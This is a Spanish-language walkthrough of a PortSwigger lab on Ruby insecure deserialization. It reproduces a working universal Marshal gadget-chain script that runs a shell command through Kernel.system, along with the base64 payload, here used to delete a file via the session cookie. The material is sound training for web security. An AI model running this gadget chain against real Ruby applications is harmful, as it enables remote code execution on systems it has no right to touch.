---
title: "Exploiting Ruby deserialization using a documented gadget chain"
description: "Laboratorio de Portswigger sobre Insecure Deserialization"
date: 2025-01-02 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - Insecure Deserialization
tags:
  - Insecure Deserialization
  - Exploiting Ruby deserialization using a documented gadget chain
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` utiliza un mecanismo de `sesiones` basado en la `serialización` y el `framework Ruby on Rails`. Existen `exploits documentados` que permiten la `ejecución remota de código` mediante una `cadena de gadgets` en este `framework`. Para `resolver` el laboratorio, debemos encontrar un `exploit documentado` y adaptarlo para crear un `objeto serializado malicioso` que contenga una `carga útil de ejecución remota de código`. Luego, pasamos este `objeto` al `sitio web` para eliminar el archivo `morale.txt` del `directorio personal` de Carlos. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/Insecure-Deserialization-Lab-7/image_1.png)

Pulsamos sobre `My account` y nos `logueamos` utilizando las credenciales `wiener:peter`

![](/assets/img/Insecure-Deserialization-Lab-7/image_2.png)

`Refrescamos` la `web` con `F5` y `capturamos` la `petición` con `Burpsuite`

![](/assets/img/Insecure-Deserialization-Lab-7/image_3.png)

El `token` está en `base64` así que lo `decodeamos` y vemos que es un `objeto`, esta estructura es típica de la librería `Marshal` de `ruby`

```
# echo 'BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVpa2dnNzM0b3huMnlmaGRpbnB1bGczbDhreGRubGNnZAY7B0YK' | base64 -d 
o:	User:@usernameI"
                        wiener:EF:@access_tokenI"%ikgg734oxn2yfhdinpulg3l8kxdnlcgd;F 
```

En esta web [https://nastystereo.com/security/ruby-3.4-deserialization.html](https://nastystereo.com/security/ruby-3.4-deserialization.html) podemos encontrar `artículos` para `efectuar` un `Deserialization Gadget Chain` en `ruby`. En mi caso voy a usar este `script` extraído de [https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) que nos `genera` un `objeto serializado` en `ruby`, el cual nos permite `ejecutar comandos` en `versiones` de ruby `inferiores` a la `3.0.2`

```
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

require "base64"
puts Base64.encode64(payload).gsub("\n", "")
```

En mi caso he usado [https://www.jdoodle.com/execute-ruby-online](https://www.jdoodle.com/execute-ruby-online) para `seleccionar` la `versión correspondiente` y `generar` el `payload` en `base64`

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ
```

Debido a que el parámetro `session` de la `cookie` es un `objeto` de `ruby`, podemos `abrirnos` el `navegador` y con `Ctrl + Shift + i` pegar el `objeto` que hemos `creado`

![](/assets/img/Insecure-Deserialization-Lab-7/image_4.png)
